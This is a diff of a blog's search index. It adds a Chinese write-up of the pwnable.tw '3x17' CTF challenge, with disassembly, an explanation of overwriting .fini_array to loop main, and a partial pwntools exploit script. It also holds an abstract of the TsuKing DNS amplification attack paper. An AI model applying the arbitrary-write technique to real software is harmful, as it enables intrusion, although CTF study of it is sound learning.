@@ -1,6 +1,84 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Pwanable.tw No.32 3x17</title>
+    <url>/posts/Pwanable-No32-3x17-zh/</url>
+    <content><![CDATA[<h1 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h1><aside>
+❓ 3 x 17 = ?
+
+</aside>
+
+<p>非常简洁</p>
+<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><img src="/posts_files/Pwanable-No%2032-3x17%2076c0044e8f944a46a0ae8c1e32bfbdc7/Untitled.png" alt="Untitled"></p>
+<p><img src="/posts_files/Pwanable-No%2032-3x17%2076c0044e8f944a46a0ae8c1e32bfbdc7/Untitled%201.png" alt="Untitled"></p>
+<p>总结一下，这个程序的防护并不完善：</p>
+<ul>
+<li>x64的小端</li>
+<li>部分GOT只读</li>
+<li>没有栈保护</li>
+<li>禁止堆栈可执行</li>
+<li>没有地址随机化</li>
+</ul>
+<h2 id="执行看看"><a href="#执行看看" class="headerlink" title="执行看看"></a>执行看看</h2><p><img src="/posts_files/Pwanable-No%2032-3x17%2076c0044e8f944a46a0ae8c1e32bfbdc7/Untitled%202.png" alt="Untitled"></p>
+<p>不明所以，要求输入地址和数据，感觉是直接向指定位置写入数据？还是逆向看看</p>
+<p>抹除了函数表，只能从_start函数进行定位，但其实根据输出的字符串 <code>addr:</code> 也能定位到 <code>main</code> 函数</p>
+<p><img src="/posts_files/Pwanable-No%2032-3x17%2076c0044e8f944a46a0ae8c1e32bfbdc7/Untitled%203.png" alt="Untitled"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.text:0000000000401B6D                         main proc near</span><br><span class="line">.text:0000000000401B6D</span><br><span class="line">.text:0000000000401B6D                         var_28= qword ptr -28h</span><br><span class="line">.text:0000000000401B6D                         buf= byte ptr -20h</span><br><span class="line">.text:0000000000401B6D                         var_8= qword ptr -8</span><br><span class="line">.text:0000000000401B6D</span><br><span class="line">.text:0000000000401B6D                         ; __unwind &#123;</span><br><span class="line">.text:0000000000401B6D 55                      push    rbp</span><br><span class="line">.text:0000000000401B6E 48 89 E5                mov     rbp, rsp</span><br><span class="line">.text:0000000000401B71 48 83 EC 30             sub     rsp, 30h        ; Integer Subtraction</span><br><span class="line">.text:0000000000401B75 64 48 8B 04 25 28 00 00+mov     rax, fs:28h</span><br><span class="line">.text:0000000000401B75 00</span><br><span class="line">.text:0000000000401B7E 48 89 45 F8             mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000401B82 31 C0                   xor     eax, eax        ; Logical Exclusive OR</span><br><span class="line">.text:0000000000401B84 0F B6 05 A5 77 0B 00    movzx   eax, cs:only_writeonce_global_variable ; Move with Zero-Extend</span><br><span class="line">.text:0000000000401B8B 83 C0 01                add     eax, 1          ; Add</span><br><span class="line">.text:0000000000401B8E 88 05 9C 77 0B 00       mov     cs:only_writeonce_global_variable, al</span><br><span class="line">.text:0000000000401B94 0F B6 05 95 77 0B 00    movzx   eax, cs:only_writeonce_global_variable ; Move with Zero-Extend</span><br><span class="line">.text:0000000000401B9B 3C 01                   cmp     al, 1           ; Compare Two Operands</span><br><span class="line">.text:0000000000401B9D 0F 85 92 00 00 00       jnz     loc_401C35      ; Jump <span class="keyword">if</span> Not Zero (ZF=0)</span><br></pre></td></tr></table></figure>
+
+<p>从反汇编结果可以看得出来，这就是一个读取输入的地址与内容，并写入指定内存位置</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = (<span class="type">unsigned</span> __int8)++only_writeonce_global_variable;</span><br><span class="line">  <span class="keyword">if</span> ( only_writeonce_global_variable == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="string">&#x27;\x01&#x27;</span>, <span class="string">&quot;addr:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">    v4 = (<span class="type">char</span> *)(<span class="type">int</span>)sub_40EE70(buf);</span><br><span class="line">    write(<span class="number">1u</span>, <span class="string">&quot;data:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, v4, <span class="number">0x18</span>uLL);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v6 )</span><br><span class="line">    sub_44A3E0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但有一些限制：</p>
+<ol>
+<li>有一个全局变量，只能写一次</li>
+<li>输入的内容最多只有0x18所以并不能构造ROP，所以这才是本题最精妙的地方</li>
+</ol>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h1><h2 id="libc-csu-init-libc-csu-fini"><a href="#libc-csu-init-libc-csu-fini" class="headerlink" title="__libc_csu_init &amp;&amp; __libc_csu_fini"></a><strong>__libc_csu_init &amp;&amp; __libc_csu_fini</strong></h2><blockquote>
+<p>有关这部分的函数逻辑，可以参考: <a href="/posts_files/https://blog.csdn.net/gary_ygl/article/details/8506007">linux编程之main()函数启动过程</a></p>
+</blockquote>
+<p>在看<code>_start</code>函数的时候就可以发现，一共压入了三个函数，包括了<code>main</code>函数:</p>
+<p><img src="/posts_files/Pwanable-No%2032-3x17%2076c0044e8f944a46a0ae8c1e32bfbdc7/Untitled%204.png" alt="Untitled"></p>
+<p>这是实际是执行的顺序，也就是说在 <code>main</code> 函数执行前，会执行 <code>__libc_csu_init</code> 函数；在执行后会执行 <code>__libc_csu_fini</code> 函数。</p>
+<p><code>__libc_csu_init/fini</code> 会执行多个函数，且顺序相反，具体而言，执行顺序如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init</span><br><span class="line">.init_array[0]</span><br><span class="line">.init_array[1]</span><br><span class="line">…</span><br><span class="line">.init_array[n]</span><br><span class="line">main</span><br><span class="line">.fini_array[n]</span><br><span class="line">…</span><br><span class="line">.fini_array[1]</span><br><span class="line">.fini_array[0]</span><br><span class="line">.fini</span><br></pre></td></tr></table></figure>
+
+<p>这其中，<code>__libc_csu_init</code>执行<code>.init</code>和<code>.init_array</code>；<code>__libc_csu_fini</code>执行<code>.fini</code>和<code>.fini_array</code></p>
+<h2 id="libc-csu-fini"><a href="#libc-csu-fini" class="headerlink" title="__libc_csu_fini"></a><strong>__libc_csu_fini</strong></h2><p>来看看<code>__libc_csu_fini</code>函数先</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000402960                                         public __libc_csu_fini</span><br><span class="line">.text:0000000000402960                         __libc_csu_fini proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:0000000000402960                         ; __unwind &#123;</span><br><span class="line">.text:0000000000402960 55                                      push    rbp</span><br><span class="line">.text:0000000000402961 48 8D 05 98 17 0B 00                    lea     rax, unk_4B4100 ; Load Effective Address</span><br><span class="line">.text:0000000000402968 48 8D 2D 81 17 0B 00                    lea     rbp, _fini_array ; Load Effective Address</span><br><span class="line">.text:000000000040296F 53                                      push    rbx</span><br><span class="line">.text:0000000000402970 48 29 E8                                sub     rax, rbp        ; Integer Subtraction</span><br><span class="line">.text:0000000000402973 48 83 EC 08                             sub     rsp, 8          ; Integer Subtraction</span><br><span class="line">.text:0000000000402977 48 C1 F8 03                             sar     rax, 3          ; Shift Arithmetic Right</span><br><span class="line">.text:000000000040297B 74 19                                   jz      short loc_402996 ; Jump if Zero (ZF=1)</span><br><span class="line">.text:000000000040297D 48 8D 58 FF                             lea     rbx, [rax-1]    ; Load Effective Address</span><br><span class="line">.text:0000000000402981 0F 1F 80 00 00 00 00                    nop     dword ptr [rax+00000000h] ; No Operation</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988                         loc_402988:                             ; CODE XREF: __libc_csu_fini+34↓j</span><br><span class="line">.text:0000000000402988 FF 54 DD 00                             call    qword ptr [rbp+rbx*8+0] ; Indirect Call Near Procedure</span><br><span class="line">.text:000000000040298C 48 83 EB 01                             sub     rbx, 1          ; Integer Subtraction</span><br><span class="line">.text:0000000000402990 48 83 FB FF                             cmp     rbx, 0FFFFFFFFFFFFFFFFh ; Compare Two Operands</span><br><span class="line">.text:0000000000402994 75 F2                                   jnz     short loc_402988 ; Jump if Not Zero (ZF=0)</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996                         loc_402996:                             ; CODE XREF: __libc_csu_fini+1B↑j</span><br><span class="line">.text:0000000000402996 48 83 C4 08                             add     rsp, 8          ; Add</span><br><span class="line">.text:000000000040299A 5B                                      pop     rbx</span><br><span class="line">.text:000000000040299B 5D                                      pop     rbp</span><br><span class="line">.text:000000000040299C E9 8B B9 08 00                          jmp     _term_proc      ; Jump</span><br><span class="line">.text:000000000040299C                         ; &#125; // starts at 402960</span><br><span class="line">.text:000000000040299C                         __libc_csu_fini endp</span><br></pre></td></tr></table></figure>
+
+<p><strong>所以该函数就是从列表中循环取出函数执行</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_402960</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (&amp;unk_4B4100 - (_UNKNOWN *)fini_array) &gt;&gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = ((&amp;unk_4B4100 - (_UNKNOWN *)fini_array) &gt;&gt; <span class="number">3</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      fini_array[v0--]();</span><br><span class="line">    <span class="keyword">while</span> ( v0 != <span class="number">-1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> term_proc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.fini_array:<span class="number">00000000004B</span>40F0                         _fini_array     segment qword public <span class="string">&#x27;DATA&#x27;</span> use64</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0                                         assume cs:_fini_array</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0                                         ;org <span class="number">4B</span>40F0h</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0                                         public _fini_array</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0 <span class="number">00</span> <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> _fini_array     dq offset sub_401B00    ; DATA XREF: __libc_csu_init+<span class="number">4</span>C↑o</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F0                                                                 ; __libc_csu_fini+<span class="number">8</span>↑o</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F8 <span class="number">80</span> <span class="number">15</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                 dq offset sub_401580</span><br><span class="line">.fini_array:<span class="number">00000000004B</span>40F8                         _fini_array     ends</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 <code>fini_array</code> 中一共有两个函数，先执行 <code>sub_401580</code> 后执行 <code>sub_401B00</code> </p>
+<h2 id="覆写-libc-csu-fini"><a href="#覆写-libc-csu-fini" class="headerlink" title="覆写**__libc_csu_fini**"></a>覆写**__libc_csu_fini**</h2><p>通过修改 <code>_fini_array</code> 可以执行我们想执行的函数，但题目很明显没有给我们留后门函数，变通之下可以修改其为 <code>main</code> 函数，从而实现多次任意写。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">init[init] --&gt; init_array[&quot;init_array[0]&quot;]</span><br><span class="line">init_array --&gt; init_array1[&quot;init_array[1]&quot;]</span><br><span class="line">init_array1 --&gt; main</span><br><span class="line">main --&gt; fini</span><br><span class="line">fini --&gt; fini_array1[&quot;fini_array[1](main)&quot;]</span><br><span class="line">fini_array1 --&gt; fini_array0[&quot;fini_array[0](fini)&quot;]</span><br><span class="line">fini_array0 --&gt; fini</span><br></pre></td></tr></table></figure>
+
+<p><code>main</code> 函数中的任意写可以写0x18足够覆盖<code>fini_array</code> </p>
+<blockquote>
+<p>虽然<code>main</code> 函数中有全局变量只能写一次，但加加加的很快会溢出，约等于没有这个限制(这个东西的设计没太有意义)</p>
+</blockquote>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><h2 id="多次任意写"><a href="#多次任意写" class="headerlink" title="多次任意写"></a>多次任意写</h2><p>首先覆盖<code>fini_array</code> 来实现多次循环调用漏洞点</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&quot;./3x17&quot;</span>)</span><br><span class="line">io = process(myelf.path)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr,data</span>):</span><br><span class="line">	io.recv()</span><br><span class="line">	io.send(<span class="built_in">str</span>(addr))</span><br><span class="line">	io.recv()</span><br><span class="line">	io.send(data)</span><br><span class="line"></span><br><span class="line">write(fini_array,p64(libc_csu_fini)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>至于后续，确实是参考其他WR才想到的方法，核心就是，利用特殊指令段修改RSP，然后就可以通过ret指令不断的在栈上跳转要执行的指令（ROP），挺巧妙，直接参考轩哥的WP吧，写的很好。</p>
+<p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/">https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/</a></p>
+<hr>
+<h1 id="WR"><a href="#WR" class="headerlink" title="WR:"></a>WR:</h1><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/">https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/</a></p>
+<p><a href="https://eqqie.cn/index.php/archives/1335">https://eqqie.cn/index.php/archives/1335</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwnable.tw</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>TsuKing Attack</title>
     <url>/posts/TsuKing/</url>
     <content><![CDATA[<h1 id="TsuKing-Coordinating-DNS-Resolvers-and-Queries-into-Potent-DoS-Amplifiers"><a href="#TsuKing-Coordinating-DNS-Resolvers-and-Queries-into-Potent-DoS-Amplifiers" class="headerlink" title="TsuKing: Coordinating DNS Resolvers and Queries into Potent DoS Amplifiers"></a>TsuKing: Coordinating DNS Resolvers and Queries into Potent DoS Amplifiers</h1><p>we present a new DNS amplification attack, named TsuKing. Instead of exploiting individual DNS resolvers indepen- dently to achieve an amplification effect, TsuKing deftly coordi- nates numerous vulnerable DNS resolvers and crafted queries together to form potent DoS amplifiers. We demonstrate that with TsuKing, an initial small amplification factor can increase exponentially through the internal layers of coordinated amplifiers, resulting in an extremely powerful amplification attack. TsuKing has three variants, including DNSRetry, DNSChain, and DNSLoop, all of which exploit a suite of inconsistent DNS implementations to achieve enormous amplification effect. With comprehensive mea- surements, we found that about 14.5% of 1.3M open DNS resolvers are potentially vulnerable to TsuKing. Real-world controlled eval- uations indicated that attackers can achieve a packet amplification factor of at least 3,700× (DNSChain). We have reported vulner- abilities to affected vendors and provided them with mitigation recommendations. We have received positive responses from 6 vendors, including Unbound, MikroTik, and AliDNS, and 3 CVEs were assigned. Some of them are implementing our recommendations.</p>
@@ -60,19 +138,6 @@
       </categories>
       <tags>
         <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwnable.tw#32</title>
-    <url>/posts/pwnable-tw-32-zh/</url>
-    <content><![CDATA[<h1 id="做个测试"><a href="#做个测试" class="headerlink" title="做个测试"></a>做个测试</h1>]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>PWN</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>pwnable.tw</tag>
       </tags>
   </entry>
 </search>
